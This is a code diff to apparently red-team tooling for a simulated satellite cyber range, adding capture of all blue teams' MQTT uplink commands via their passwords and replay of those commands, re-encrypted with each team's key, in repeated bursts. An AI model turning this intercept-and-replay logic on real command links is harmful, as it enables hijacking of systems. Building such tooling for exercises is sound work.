@@ -25,11 +25,13 @@ Call :meth:`InterceptReplaySequence.tick` from your ``on_session`` callback with
 from __future__ import annotations
 
 import base64
+import hashlib
 import json
 import random
 import threading
+import time
 from dataclasses import asdict, dataclass
-from typing import Any, Callable, Optional, TYPE_CHECKING
+from typing import Any, Callable, Optional, TYPE_CHECKING, Union
 
 from . import downlink_codec as dc
 from . import printer
@@ -42,7 +44,7 @@ if TYPE_CHECKING:
 
 @dataclass
 class CapturedWire:
-    """One stored on-air prefix from an Uplink Intercept record."""
+    """Stored replay material — either on-air intercept bytes or MQTT JSON (password layer only)."""
 
     payload_b64: str
     rx_frequency_mhz: Optional[float]
@@ -50,6 +52,8 @@ class CapturedWire:
     flags: int
     addressed_to_us: bool
     parse_ok: bool
+    capture_source: str = "intercept"
+    """``intercept`` = on-air ciphertext from Format 3; ``mqtt_json`` = UTF-8 JSON after XOR decrypt."""
 
     @classmethod
     def from_intercept(cls, rec: dict[str, Any]) -> "CapturedWire":
@@ -477,6 +481,150 @@ class MultiTeamCaptureSequence:
                 printer.error(f"capture on_complete: {e}")
 
 
+class MqttUplinkCaptureSequence:
+    """
+    Listen on **all** blue-team MQTT ``Uplink`` topics at once via a wildcard
+    subscription (transport layer is XOR with each team's password only).
+
+    Valid UTF-8 JSON payloads are stored per ``team_id`` as
+    :class:`CapturedWire` rows with ``capture_source=\"mqtt_json\"`` (plaintext
+    JSON bytes, Base64 in ``payload_b64``). Used when you want every team's
+    commands without cycling RF / Format-3 intercept.
+
+    Drive with :meth:`tick` from ``on_session``. Unsubscribes automatically at
+    ``end_at``. Requires **enemy team passwords** in config (same as any XOR
+    tooling).
+    """
+
+    def __init__(
+        self,
+        client: "SpaceRangeClient",
+        blue_teams: list["TeamConfig"],
+        *,
+        start_at: float,
+        end_at: float,
+        max_per_team: int = 512,
+    ) -> None:
+        if max_per_team < 1:
+            raise ValueError("max_per_team must be >= 1")
+        if end_at <= start_at:
+            raise ValueError("end_at must be > start_at")
+
+        self._client = client
+        self._teams: list["TeamConfig"] = list(blue_teams)
+        self._team_by_id: dict[int, "TeamConfig"] = {t.id: t for t in self._teams}
+
+        self._start_at = float(start_at)
+        self._end_at = float(end_at)
+        self._max_per_team = int(max_per_team)
+
+        self._pools: dict[int, list[CapturedWire]] = {t.id: [] for t in self._teams}
+        self._lock = threading.Lock()
+        self._started = False
+        self._capturing = False
+        self._completed = False
+
+        self.on_complete: Optional[Callable[[dict[int, list[CapturedWire]]], None]] = None
+
+    def tick(self, sim_time: float) -> None:
+        if self._completed:
+            return
+        if not self._started and sim_time >= self._start_at:
+            self._begin()
+        if not self._capturing:
+            return
+        if sim_time >= self._end_at:
+            printer.info(f"mqtt_capture: window ended at t={sim_time:.0f}s — finalising")
+            self._finalise()
+
+    def _begin(self) -> None:
+        if not self._teams:
+            printer.warn("mqtt_capture: no blue teams — skipping")
+            self._completed = True
+            return
+        self._started = True
+        self._capturing = True
+        self._client.start_foreign_uplink_capture(self._teams, self._on_uplink)
+        printer.info(
+            f"mqtt_capture: started — {len(self._teams)} team(s), "
+            f"max {self._max_per_team} JSON cmd(s)/team, "
+            f"window=[{self._start_at:.0f}, {self._end_at:.0f}]s"
+        )
+
+    def _on_uplink(self, team_id: int, decrypted: bytes) -> None:
+        try:
+            json.loads(decrypted.decode("utf-8"))
+        except (json.JSONDecodeError, UnicodeDecodeError):
+            return
+
+        with self._lock:
+            if not self._capturing:
+                return
+            pool = self._pools.get(team_id)
+            if pool is None or len(pool) >= self._max_per_team:
+                return
+            wire = CapturedWire(
+                payload_b64=base64.standard_b64encode(decrypted).decode("ascii"),
+                rx_frequency_mhz=None,
+                sim_time=0.0,
+                flags=0,
+                addressed_to_us=False,
+                parse_ok=True,
+                capture_source="mqtt_json",
+            )
+            pool.append(wire)
+            name = self._team_by_id[team_id].name
+            printer.info(f"mqtt_capture: stored JSON cmd for '{name}' ({len(pool)}/{self._max_per_team})")
+
+    def get_pools(self) -> dict[int, list[CapturedWire]]:
+        with self._lock:
+            return {tid: list(pool) for tid, pool in self._pools.items()}
+
+    def total_captured(self) -> int:
+        with self._lock:
+            return sum(len(p) for p in self._pools.values())
+
+    def save(self, path: str) -> None:
+        with self._lock:
+            data = {
+                "capture_mode": "mqtt_uplink_json",
+                "teams": [
+                    {
+                        "team_id": t.id,
+                        "team_name": t.name,
+                        "frequency_mhz": float(t.frequency),
+                        "key": int(t.key),
+                        "captures": [asdict(w) for w in self._pools[t.id]],
+                    }
+                    for t in self._teams
+                ],
+                "started": self._started,
+                "completed": self._completed,
+            }
+        with open(path, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=2)
+
+    def _finalise(self) -> None:
+        with self._lock:
+            if self._completed:
+                return
+            self._completed = True
+            self._capturing = False
+        try:
+            self._client.stop_foreign_uplink_capture()
+        except Exception as e:
+            printer.warn(f"mqtt_capture: stop_foreign_uplink_capture failed: {e}")
+        total = self.total_captured()
+        printer.success(
+            f"mqtt_capture: complete — {total} JSON command(s) across {len(self._teams)} team(s)"
+        )
+        if self.on_complete:
+            try:
+                self.on_complete(self.get_pools())
+            except Exception as e:
+                printer.error(f"mqtt_capture on_complete: {e}")
+
+
 class MultiTeamReplaySequence:
     """
     Schedule N replay **rounds** at random sim-times within ``[start, end]``.
@@ -484,24 +632,29 @@ class MultiTeamReplaySequence:
     Each **round** (one tick of the state machine at a scheduled time):
 
     1. For **every** blue team in the capture sequence, in roster order,
-       picks a **random** :class:`CapturedWire` from **that team's pool only**.
+       picks *shots_per_team_per_burst* random wires from **that team's pool**
+       (with replacement if the pool is small).
     2. Tunes the rogue's ground TX to that team's nominal frequency
-       (``set_telemetry``) so the EM-sensor view shows the carrier change.
-    3. Calls :func:`replay.replay_transmit_bytes` with the captured
-       on-air bytes.
+       (``set_telemetry``), waits *inter_team_delay_seconds* **wall-clock**
+       seconds before tuning the **next** team (the broker rejects rapid
+       ``set_telemetry``).
+    3. For each chosen wire, calls :func:`replay.replay_transmit_bytes` with the captured
+       on-air bytes — **unless** the wire came from MQTT JSON capture
+       (``capture_source=\"mqtt_json\"``), in which case the stored UTF-8 JSON
+       is Caesar-encrypted with that team's RF key at transmit time, then sent.
 
        If a team's pool is empty at round fire-time, that team is skipped
-       for that round (logged). Otherwise every team receives one injection
-       attempt per round so bursts align across crews.
+       for that round (logged).
 
-    Logs every transmit for forensics (round index, team, success).
+    Logs every transmit for forensics (round index, team, shot index, success).
 
     Parameters
     ----------
     client:
         The rogue's :class:`~src.mqtt_client.SpaceRangeClient`.
     capture:
-        The :class:`MultiTeamCaptureSequence` whose pools to draw from.
+        Any capture sequence exposing ``get_pools()`` and ``_teams`` — e.g.
+        :class:`MultiTeamCaptureSequence` or :class:`MqttUplinkCaptureSequence`.
     start_at:
         Earliest sim-time a burst may fire.
     end_at:
@@ -512,23 +665,39 @@ class MultiTeamReplaySequence:
         RNG seed for reproducible random burst times. Default ``None`` = random.
     bandwidth_mhz:
         Bandwidth used in the ground-transmitter ``set_telemetry`` snapshot.
+    frequency_for_team:
+        If set, called as ``frequency_for_team(team)`` to resolve MHz at each
+        replay shot (e.g. live admin lookup). Otherwise ``team.frequency``.
+    shots_per_team_per_burst:
+        How many random replay transmits to send **per team** each round.
+    inter_team_delay_seconds:
+        Wall-clock sleep before ``set_telemetry`` for the **next** team after
+        finishing a team that tuned/transmitted (default ``3`` avoids
+        "Already changing telemetry settings").
     """
 
     def __init__(
         self,
         client: "SpaceRangeClient",
-        capture: MultiTeamCaptureSequence,
+        capture: Union[MultiTeamCaptureSequence, MqttUplinkCaptureSequence],
         *,
         start_at: float,
         end_at: float,
         burst_count: int = 8,
         seed: Optional[int] = None,
         bandwidth_mhz: float = 5.0,
+        frequency_for_team: Optional[Callable[["TeamConfig"], float]] = None,
+        shots_per_team_per_burst: int = 3,
+        inter_team_delay_seconds: float = 3.0,
     ) -> None:
         if end_at <= start_at:
             raise ValueError("end_at must be > start_at")
         if burst_count < 1:
             raise ValueError("burst_count must be >= 1")
+        if shots_per_team_per_burst < 1:
+            raise ValueError("shots_per_team_per_burst must be >= 1")
+        if inter_team_delay_seconds < 0:
+            raise ValueError("inter_team_delay_seconds must be >= 0")
 
         self._client = client
         self._capture = capture
@@ -537,6 +706,9 @@ class MultiTeamReplaySequence:
         self._burst_count = int(burst_count)
         self._rng = random.Random(seed)
         self._bandwidth = float(bandwidth_mhz)
+        self._frequency_for_team = frequency_for_team
+        self._shots_per_team = int(shots_per_team_per_burst)
+        self._inter_team_delay_seconds = float(inter_team_delay_seconds)
 
         self._times: list[float] = []
         self._next_idx = 0
@@ -612,6 +784,7 @@ class MultiTeamReplaySequence:
                         "team_id": None,
                         "team_name": None,
                         "freq_mhz": None,
+                        "shot_in_round": None,
                         "success": False,
                         "reason": "no teams",
                     }
@@ -632,12 +805,14 @@ class MultiTeamReplaySequence:
                         "team_id": None,
                         "team_name": None,
                         "freq_mhz": None,
+                        "shot_in_round": None,
                         "success": False,
                         "reason": "no captures",
                     }
                 )
             return
 
+        prev_team_used_telemetry = False
         for team in teams:
             tid = team.id
             ws = pools.get(tid, [])
@@ -654,14 +829,25 @@ class MultiTeamReplaySequence:
                             "team_id": tid,
                             "team_name": team.name,
                             "freq_mhz": None,
+                            "shot_in_round": None,
                             "success": False,
                             "reason": "no captures for team",
                         }
                     )
                 continue
 
-            wire = self._rng.choice(ws)
-            freq = float(team.frequency)
+            if prev_team_used_telemetry and self._inter_team_delay_seconds > 0:
+                printer.info(
+                    f"replay: waiting {self._inter_team_delay_seconds:.1f}s before next team "
+                    f"({team.name}) …"
+                )
+                time.sleep(self._inter_team_delay_seconds)
+
+            freq = (
+                float(self._frequency_for_team(team))
+                if self._frequency_for_team is not None
+                else float(team.frequency)
+            )
             snap = RFLinkSnapshot(
                 frequency_mhz=freq,
                 key=int(team.key),
@@ -672,47 +858,55 @@ class MultiTeamReplaySequence:
             except Exception as e:
                 printer.warn(f"replay: tune_ground failed for '{team.name}': {e}")
 
-            try:
-                resp = replay_transmit_bytes(
-                    self._client, freq, wire.payload_b64, encoding="base64"
-                )
-            except Exception as e:
-                printer.error(f"replay: transmit_bytes raised: {e}")
-                resp = None
+            wires = self._rng.choices(ws, k=self._shots_per_team)
+            for shot_idx, wire in enumerate(wires, start=1):
+                try:
+                    plain = base64.standard_b64decode(wire.payload_b64.encode("ascii"))
+                    src = getattr(wire, "capture_source", "intercept")
+                    if src == "mqtt_json":
+                        tx_bytes = dc.caesar_encrypt(int(team.key), plain)
+                    else:
+                        tx_bytes = plain
+                    data_b64 = base64.standard_b64encode(tx_bytes).decode("ascii")
+                    resp = replay_transmit_bytes(
+                        self._client, freq, data_b64, encoding="base64"
+                    )
+                    payload_hash = hashlib.sha1(tx_bytes).hexdigest()[:12]
+                except Exception as e:
+                    printer.error(f"replay: transmit_bytes raised: {e}")
+                    resp = None
+                    payload_hash = ""
 
-            ok = bool(resp and resp.get("success"))
-            payload_hash = ""
-            try:
-                import hashlib
+                ok = bool(resp and resp.get("success"))
 
-                raw = base64.standard_b64decode(wire.payload_b64.encode("ascii"))
-                payload_hash = hashlib.sha1(raw).hexdigest()[:12]
-            except Exception:
-                pass
+                with self._lock:
+                    self._log.append(
+                        {
+                            "sim_time": sim_time,
+                            "burst_round": burst_no,
+                            "team_id": tid,
+                            "team_name": team.name,
+                            "freq_mhz": freq,
+                            "shot_in_round": shot_idx,
+                            "payload_sha1_12": payload_hash,
+                            "success": ok,
+                        }
+                    )
 
-            with self._lock:
-                self._log.append(
-                    {
-                        "sim_time": sim_time,
-                        "burst_round": burst_no,
-                        "team_id": tid,
-                        "team_name": team.name,
-                        "freq_mhz": freq,
-                        "payload_sha1_12": payload_hash,
-                        "success": ok,
-                    }
-                )
+                if ok:
+                    printer.success(
+                        f"replay: t={sim_time:.0f}s round {burst_no}/{self._burst_count} "
+                        f"shot {shot_idx}/{self._shots_per_team} "
+                        f"→ '{team.name}' @ {freq} MHz (sha1={payload_hash})"
+                    )
+                else:
+                    printer.error(
+                        f"replay: t={sim_time:.0f}s round {burst_no}/{self._burst_count} "
+                        f"shot {shot_idx}/{self._shots_per_team} "
+                        f"failed → '{team.name}' @ {freq} MHz: {resp}"
+                    )
 
-            if ok:
-                printer.success(
-                    f"replay: t={sim_time:.0f}s round {burst_no}/{self._burst_count} "
-                    f"→ '{team.name}' @ {freq} MHz (sha1={payload_hash})"
-                )
-            else:
-                printer.error(
-                    f"replay: t={sim_time:.0f}s round {burst_no}/{self._burst_count} "
-                    f"failed → '{team.name}' @ {freq} MHz: {resp}"
-                )
+            prev_team_used_telemetry = True
 
     def _finalise(self) -> None:
         with self._lock:
@@ -723,7 +917,7 @@ class MultiTeamReplaySequence:
         n_ok = sum(1 for r in log_copy if r.get("success"))
         printer.success(
             f"replay: complete — {n_ok}/{len(log_copy)} transmit(s) succeeded "
-            f"({self._burst_count} round(s) × {len(self._capture._teams)} team(s) max)"
+            f"({self._burst_count} burst(s), up to {self._shots_per_team} shot(s)/team)"
         )
         if self.on_complete:
             try:
